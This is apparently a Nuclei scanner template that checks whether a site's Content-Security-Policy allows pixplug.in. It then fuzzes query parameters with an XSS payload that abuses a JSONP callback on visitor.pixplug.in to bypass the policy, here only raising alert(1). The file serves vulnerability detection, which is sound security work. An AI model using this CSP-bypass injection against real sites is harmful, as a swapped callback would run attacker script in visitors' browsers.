id: pixplug-visitor-csp-bypass

info:
  name: Content-Security-Policy Bypass - PixPlug Visitor
  author: renniepak,DhiyaneshDK
  severity: medium
  reference:
    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  metadata:
    verified: true
  tags: xss,csp-bypass,pixplug-visitor,vuln

flow: http(1) && headless(1)

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    matchers:
      - type: word
        part: header
        words:
          - "Content-Security-Policy"
          - "pixplug.in"
        condition: and
        internal: true

headless:
  - steps:
      - action: navigate
        args:
          url: "{{BaseURL}}"

      - action: waitdialog
        name: pixplug_visitor_csp_xss
        args:
          max-duration: 5s

    payloads:
      injection:
        - '<script src="https://visitor.pixplug.in/jsonp/getdata.php?callback=alert(1)"></script>'

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{url_encode(injection)}}"

    matchers:
      - type: dsl
        dsl:
          - "pixplug_visitor_csp_xss == true"
